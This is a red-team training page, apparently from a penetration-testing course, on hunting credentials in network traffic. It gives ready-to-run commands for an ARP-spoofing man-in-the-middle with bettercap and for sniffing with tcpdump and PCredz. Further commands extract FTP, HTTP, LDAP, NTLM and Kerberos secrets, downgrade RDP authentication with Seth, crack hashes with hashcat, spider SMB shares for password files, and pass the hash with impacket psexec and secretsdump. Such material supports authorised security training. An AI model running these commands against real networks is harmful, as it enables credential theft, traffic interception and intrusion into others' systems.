---
layout: training-page
title: "Network Credential Hunting — Red Team Academy"
module: "Network Attacks"
tags:
  - credential-hunting
  - network
  - pcap
  - sniffing
  - pcredz
  - wireshark
page_key: "network-credential-hunting"
render_with_liquid: false
---

# Network Credential Hunting

Network traffic contains credentials in cleartext or weakly protected forms far more often than expected. After gaining MITM position (ARP spoofing, rogue DHCP, or physical tap), extract credentials from live traffic or saved captures using automated tools before resorting to manual analysis.

## Live Capture

```bash
# tcpdump — capture everything to PCAP for offline analysis
tcpdump -i eth0 -w /tmp/capture.pcap

# Target credential-bearing ports only
tcpdump -i eth0 -w /tmp/creds.pcap \
  'tcp port 21 or tcp port 23 or tcp port 25 or tcp port 80 \
   or tcp port 110 or tcp port 143 or tcp port 389 \
   or tcp port 445 or tcp port 3389'

# Capture after ARP MITM (bettercap running)
tcpdump -i eth0 -w /tmp/mitm.pcap host 192.168.1.5

# Rotate files every 100MB to avoid filling disk
tcpdump -i eth0 -w /tmp/cap-%Y%m%d-%H%M%S.pcap -C 100 -G 3600
```

## PCredz — Automated Credential Extraction

```bash
# PCredz extracts credentials from live traffic or PCAP
# Protocols: Kerberos, NTLM, FTP, HTTP Basic, POP3, IMAP, SMTP, LDAP,
#            telnet, IRC, SNMP, NTLMv1/v2, Kerberos TGS/AS-REP
# github.com/lgandx/PCredz

# Live capture
python3 Pcredz -i eth0

# From PCAP file
python3 Pcredz -f capture.pcap

# Output saved to /tmp/CredentialsDump.txt
cat /tmp/CredentialsDump.txt
```

## NetworkMiner — Passive Reconstruction

```bash
# NetworkMiner — network forensics; reconstructs sessions, files, credentials
# networkminers.sourceforge.net (Linux/Mono or Windows)

mono NetworkMiner.exe

# Load PCAP → automatically extracts:
# - HTTP Basic Auth credentials
# - FTP passwords
# - Email (SMTP/POP3/IMAP) credentials
# - Reconstructed file transfers (images, documents, etc.)
# - Sessions and hosts tab for easy overview
```

## Protocol-Specific Extraction

### FTP (Port 21)

```bash
# FTP credentials are always cleartext
tcpdump -i eth0 -A 'tcp port 21' | grep -E "USER|PASS"

# Wireshark: ftp.request.command == "USER" || ftp.request.command == "PASS"
tshark -r capture.pcap -Y "ftp.request.command == \"USER\" or ftp.request.command == \"PASS\"" \
  -T fields -e ftp.request.arg
```

### HTTP Basic Auth

```bash
# Authorization header contains base64(user:password)
tcpdump -i eth0 -A 'tcp port 80' | grep "Authorization: Basic"

# Decode the base64
echo "dXNlcjpwYXNzd29yZA==" | base64 -d
# user:password

# Tshark
tshark -r capture.pcap -Y "http.authorization" \
  -T fields -e http.authorization
```

### NTLM — Net-NTLMv1/v2

```bash
# Captured from SMB, HTTP NTLM, or NTLM-authenticated web apps
# Tshark extract NTLMv2 for hashcat
tshark -r capture.pcap -Y "ntlmssp.auth.username" \
  -T fields -e ntlmssp.auth.domain -e ntlmssp.auth.username

# Manual extraction with Wireshark:
# Filter: ntlmssp → follow TCP stream → copy challenge + response
# Format for hashcat (-m 5600):
# user::domain:ServerChallenge:NTProofStr:blob

# PCredz handles this automatically
python3 Pcredz -f capture.pcap
```

### Kerberos — AS-REP and TGS Hashes

```bash
# AS-REP hashes (from accounts with pre-auth disabled) — crack offline
tshark -r capture.pcap -Y "kerberos.msg_type == 11" \
  -T fields -e kerberos.cname -e kerberos.realm

# TGS hashes (kerberoasting) — see AD module
# Kerberos tickets in PCAP
tshark -r capture.pcap -Y "kerberos.msg_type == 13" -V | grep -i "enc-part"

# PCredz extracts Kerberos hashes in hashcat format automatically
```

### LDAP (Cleartext)

```bash
# LDAP on port 389 is cleartext — captures bind credentials
tcpdump -i eth0 -A 'tcp port 389' | grep -i "bindRequest\|password\|uid="

# Tshark
tshark -r capture.pcap -Y "ldap.bindRequest" \
  -T fields -e ldap.name -e ldap.authentication.simple
```

### SMTP / POP3 / IMAP

```bash
# Email credentials from mail clients
tcpdump -i eth0 -A 'tcp port 25 or tcp port 110 or tcp port 143' \
  | grep -E "AUTH|USER|PASS"

# POP3 example
# USER admin
# PASS password123

# SMTP AUTH (base64 encoded)
# AUTH LOGIN
# YWRtaW4=  (admin)
# cGFzc3dvcmQ= (password)
echo "YWRtaW4=" | base64 -d
```

### SNMP Community Strings

```bash
# SNMP v1/v2c community strings are cleartext
tcpdump -i eth0 -A 'udp port 161 or udp port 162'

# Tshark
tshark -r capture.pcap -Y "snmp" -T fields -e snmp.community

# Common community strings found in captures:
# public, private, community, admin, cisco, snmpd
```

### RDP (Port 3389)

```bash
# RDP itself is encrypted but:
# - NLA (Network Level Auth) uses NTLMv2 before TLS → capturable
# - Legacy RDP without NLA sends credentials inside TLS
#   (need cert to decrypt, or proxy via RDP MITM)

# Capture NLA NTLM handshake
tcpdump -i eth0 -w rdp.pcap 'tcp port 3389'
# PCredz or Wireshark → look for NTLMSSP in captured stream

# RDP MITM: Seth
# github.com/SySS-Research/Seth
python3 seth.py eth0 192.168.1.5 192.168.1.10 192.168.1.1
# Proxies RDP, downgrades NLA, captures credentials in cleartext
```

## Automated MITM + Capture Workflow

```bash
# Full workflow: ARP MITM → capture → extract credentials

# 1. Start bettercap (ARP poison + capture)
bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.5;
  arp.spoof on;
  set net.sniff.output /tmp/mitm.pcap;
  net.sniff on"

# 2. Wait 10-30 minutes during business hours

# 3. Stop capture and extract credentials
python3 Pcredz -f /tmp/mitm.pcap

# 4. Review output
cat /tmp/CredentialsDump.txt
```

## PCredz — Install and Full Usage

```bash
# PCredz: live capture + PCAP analysis, extracts credentials from:
# Kerberos (AS-REQ, TGS-REP), NTLM, FTP, HTTP Basic, LDAP, POP3, IMAP,
# SMTP, Telnet, IRC, SNMP, NFS, MySQL, MSSQL
# github.com/lgandx/PCredz

# Install
git clone https://github.com/lgandx/PCredz
cd PCredz
pip3 install python-libpcap Cython
# Or using the prebuilt package:
apt install python3-pypcap

# Run against live interface (requires root)
python3 Pcredz -i eth0
# Output appears on stdout and is written to /tmp/CredentialsDump.txt

# Run against a PCAP file
python3 Pcredz -f /tmp/capture.pcap

# Run against a directory of PCAP files
python3 Pcredz -d /tmp/pcaps/

# Verbose — show all parsed frames, not just credentials
python3 Pcredz -i eth0 -v

# Output file location
cat /tmp/CredentialsDump.txt

# Parse output — group by protocol
grep "FTP" /tmp/CredentialsDump.txt
grep "NTLMv2" /tmp/CredentialsDump.txt
grep "Kerberos" /tmp/CredentialsDump.txt

# Extract just hashes for hashcat
grep "NTLMv2" /tmp/CredentialsDump.txt | awk '{print $NF}' > ntlmv2_hashes.txt
grep "Kerberos" /tmp/CredentialsDump.txt | awk '{print $NF}' > kerberos_hashes.txt

# Crack NTLMv2 (hashcat mode 5600)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
# Crack Kerberos TGS (hashcat mode 13100)
hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Protocol-Specific Credential Hunting

### LDAP Bind Credentials

```bash
# LDAP port 389 = cleartext; port 636 = LDAPS (encrypted)
# Port 3268 = Global Catalog; 3269 = GC over SSL

# Live capture of LDAP binds
tcpdump -i eth0 -A 'tcp port 389' 2>/dev/null | strings | grep -iE "uid=|password|bindRequest|1.2.840"

# Tshark — extract bind credentials
tshark -r capture.pcap -Y "ldap.bindRequest" \
  -T fields -e frame.time -e ip.src -e ldap.name -e ldap.authentication.simple

# Filter for SASL vs simple auth
tshark -r capture.pcap -Y "ldap.bindRequest.version" -V \
  | grep -A 10 "bindRequest"

# Detect LDAP password spray in captures (many failed binds)
tshark -r capture.pcap -Y "ldap.resultCode == 49" \
  -T fields -e ip.src -e ldap.name
# resultCode 49 = invalidCredentials
```

### Kerberos AS-REQ in PCAP

```bash
# Kerberos AS-REQ (password hash embedded when pre-auth is disabled)
# Also: AS-REQ contains username even when pre-auth IS required → user enumeration

# Extract AS-REQ usernames (user enumeration from capture)
tshark -r capture.pcap -Y "kerberos.msg_type == 10" \
  -T fields -e ip.src -e kerberos.CNameString -e kerberos.realm
# msg_type 10 = AS-REQ

# AS-REP hashes (pre-auth disabled — crackable offline)
tshark -r capture.pcap -Y "kerberos.msg_type == 11" \
  -T fields -e kerberos.CNameString -e kerberos.realm
# PCredz extracts these in hashcat format automatically

# TGS-REP (kerberoasting material)
tshark -r capture.pcap -Y "kerberos.msg_type == 13" \
  -T fields -e kerberos.CNameString -e kerberos.SNameString
```

### HTTP Basic Auth

```bash
# HTTP Basic Auth header: Authorization: Basic base64(user:pass)
tshark -r capture.pcap -Y "http.authorization contains \"Basic\"" \
  -T fields -e ip.src -e http.authorization

# Decode all Basic auth headers
tshark -r capture.pcap -Y "http.authorization contains \"Basic\"" \
  -T fields -e http.authorization \
  | sed 's/Basic //' | while read b64; do echo "$b64" | base64 -d; echo; done
```

## SMB Session Enumeration

```bash
# Identify who is currently logged in and where (pre-compromise recon)

# Nmap SMB session script
nmap --script smb-enum-sessions -p 445 192.168.1.0/24
# Shows: logged-in users, null sessions, guest sessions

# CrackMapExec — enumerate sessions on a target
crackmapexec smb 192.168.1.0/24 --sessions
# Output: username, source IP, logged in since

# Enumerate open sessions (requires credentials)
crackmapexec smb 192.168.1.10 -u jsmith -p Password1 --sessions

# NetBIOS session enumeration
nbtscan 192.168.1.0/24
# Reveals: NetBIOS names, domain, MAC address

# SMB share enumeration (find shares that might contain credentials)
crackmapexec smb 192.168.1.10 -u jsmith -p Password1 --shares
nmap --script smb-enum-shares -p 445 192.168.1.10

# List active SMB connections (from a compromised Windows host)
# net session
# Get-SmbOpenFile | Select-Object SessionId, ClientComputerName, ClientUserName
```

## Extracting Credentials from PCAP Files

```bash
# Full workflow: tcpdump capture → filter → PCredz → Wireshark analysis

# Step 1: Targeted capture (only credential-bearing ports)
tcpdump -i eth0 -w /tmp/creds.pcap \
  'tcp port 21 or tcp port 23 or tcp port 25 or tcp port 80 \
   or tcp port 110 or tcp port 143 or tcp port 389 \
   or tcp port 445 or tcp port 3389 or udp port 161' &

# Let it run for 30-60 minutes during business hours
sleep 3600
kill %1

# Step 2: PCredz full extraction
python3 Pcredz -f /tmp/creds.pcap -v 2>&1 | tee /tmp/pcredz_output.txt
cat /tmp/CredentialsDump.txt

# Step 3: Wireshark filter cheatsheet for manual analysis
# HTTP Basic Auth:    http.authorization
# FTP credentials:    ftp.request.command == "PASS"
# NTLM:              ntlmssp.auth.username
# Kerberos:          kerberos.CNameString
# LDAP binds:        ldap.bindRequest
# SMTP auth:         smtp.auth.password
# SMB auth:          smb.cmd == 0x73  (session setup)

# Step 4: Follow TCP streams for context (tshark)
# Find stream containing credentials
tshark -r creds.pcap -Y "ftp.request.command == \"PASS\"" \
  -T fields -e tcp.stream
# Follow that stream:
tshark -r creds.pcap -qz follow,tcp,ascii,<stream_number>

# Step 5: Extract NTLM hashes in hashcat format (manual)
# Wireshark → filter ntlmssp → find challenge and response
# Required fields:
# - ntlmssp.ntlmclientchallenge (8 bytes)
# - ntlmssp.auth.username
# - ntlmssp.auth.domain
# - ntlmssp.ntlmserverchallenge (from CHALLENGE message)
# - ntlmssp.auth.ntresponse (NTProofStr + blob)
# PCredz does this automatically — use it for efficiency
```

## Network Share Hunting for Credential Files

```bash
# Shares often contain files with credentials in cleartext
# passwords.txt, config.xml, web.config, *.config, *.ini, *.xml

# Discover accessible shares
crackmapexec smb 192.168.1.0/24 -u jsmith -p Password1 --shares
# Look for: NETLOGON, SYSVOL, shares with non-standard names (data, backup, scripts)

# Search shares for credential files (CrackMapExec spider)
crackmapexec smb 192.168.1.10 -u jsmith -p Password1 -M spider_plus \
  -o READ=True
# spider_plus downloads files matching patterns

# Impacket smbclient — manual share browsing
impacket-smbclient contoso.local/jsmith:Password1@192.168.1.10
# > shares       — list shares
# > use SYSVOL   — browse SYSVOL
# > ls           — list files
# > get passwords.txt  — download file

# Find specific file types across all shares
crackmapexec smb 192.168.1.10 -u jsmith -p Password1 -M spider_plus \
  -o PATTERN="*.xml,*.config,*.ini,*.txt,*.bat,*.ps1"

# SYSVOL — always check for Group Policy Preferences (GPP) credentials
# (MS14-025 — cpassword field in XML files)
find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;
# Or via CrackMapExec:
crackmapexec smb 192.168.1.10 -u jsmith -p Password1 -M gpp_password

# Common share credential file patterns
# web.config — ASP.NET connection strings with DB passwords
# appsettings.json — .NET Core app configs
# *.properties — Java app configs
# *.env — environment files with API keys
# Jenkinsfile, .gitlab-ci.yml — CI/CD pipeline credentials
# backup*.* — database dumps, often contain plaintext data
```

## Pass-the-Hash and Pass-the-Ticket from Network-Captured Material

```bash
# From NTLMv2 capture → crack → use plaintext password for PTH
hashcat -m 5600 ntlmv2.txt rockyou.txt --show
# If cracked: jsmith:Password1
# Use password for PTH (need NT hash, not password):
python3 -c "import hashlib; print(hashlib.new('md4', 'Password1'.encode('utf-16le')).hexdigest())"
# NT hash: <hash>
crackmapexec smb 192.168.1.0/24 -u jsmith -H <NThash>

# From PCAP → PCredz extracts Kerberos TGS (TGS-REP) → kerberoasting
# TGS hashes from PCredz output — already in hashcat 13100 format
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r rules/best64.rule

# From PCAP → NTLM relay via ntlmrelayx (not cracking — direct relay)
# See: /network-attacks/responder/ for relay workflow

# From captured Kerberos ccache files (memory / network)
# If Kerberos tickets captured in transit → export and use
# Wireshark: File → Export Objects → can't export Kerberos directly
# Use tcpdump + tshark pipeline:
tshark -r capture.pcap -Y "kerberos" -w kerberos_only.pcap
# Then process with krb5-tools or Pcredz to extract ticket material

# Impacket tools with NT hash (PTH)
impacket-secretsdump -hashes :NThash contoso.local/jsmith@192.168.1.10
impacket-wmiexec -hashes :NThash contoso.local/jsmith@192.168.1.10
impacket-psexec -hashes :NThash contoso.local/jsmith@192.168.1.10
```

## Resources

- PCredz — `github.com/lgandx/PCredz`
- NetworkMiner — `netresec.com/?page=NetworkMiner`
- Seth (RDP MITM) — `github.com/SySS-Research/Seth`
- CrackMapExec — `github.com/byt3bl33d3r/CrackMapExec`
- Impacket — `github.com/fortra/impacket`
- MITRE T1040 — Network Sniffing — `attack.mitre.org/techniques/T1040/`
- MITRE T1557 — Adversary-in-the-Middle — `attack.mitre.org/techniques/T1557/`
